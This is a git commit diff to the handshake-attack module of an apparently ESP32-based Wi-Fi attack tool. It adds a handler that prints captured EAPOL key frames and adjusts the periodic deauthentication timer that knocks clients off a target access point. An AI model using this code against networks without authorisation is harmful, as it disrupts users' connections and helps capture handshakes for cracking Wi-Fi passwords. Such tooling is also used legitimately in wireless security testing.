821b4756702c777bc533d25e3af39556618abe33
risinek <risinek@gmail.com>
2021-03-22 00:31:46 +0100

    process handshakes by listening to capture events

--- main/attack_handshake.c
+++ main/attack_handshake.c
@@ -14,6 +14,14 @@ static const char *TAG = "main:attack_handshake";
 static esp_timer_handle_t deauth_timer_handle;
 static const wifi_ap_record_t *ap_record = NULL;
 
+static void handshake_capture_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+    ESP_LOGD(TAG, "Processing handshake frame...");
+    uint8_t *frame = (uint8_t *) event_data;
+    for(unsigned i = 0; i < 20; i++){
+        printf("%02x", frame[i]);
+    }
+    printf("\n");
+}
 static void send_deauth_frame(void* arg){
     deauther_send_deauth_frame(ap_record);
 }
@@ -25,18 +33,19 @@ void attack_handshake_start(attack_config_t *attack_config){
     wifictl_sniffer_start(ap_record->primary);
     // temporary call until specific fucntion for handshake is created
     frame_analyzer_pmkid_capture_start(ap_record->bssid);
+    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_CAPTURED_EAPOLKEY, &handshake_capture_handler, NULL));
     
     const esp_timer_create_args_t deauth_timer_args = {
         .callback = &send_deauth_frame
     };
     ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
-    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000));
+    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
 }
 
 void attack_handshake_stop(){
     ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
     wifictl_sniffer_stop();
     frame_analyzer_pmkid_capture_stop();
-    ap_record = NULL;
+    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &handshake_capture_handler));
     ESP_LOGD(TAG, "Handshake attack stopped");
 }
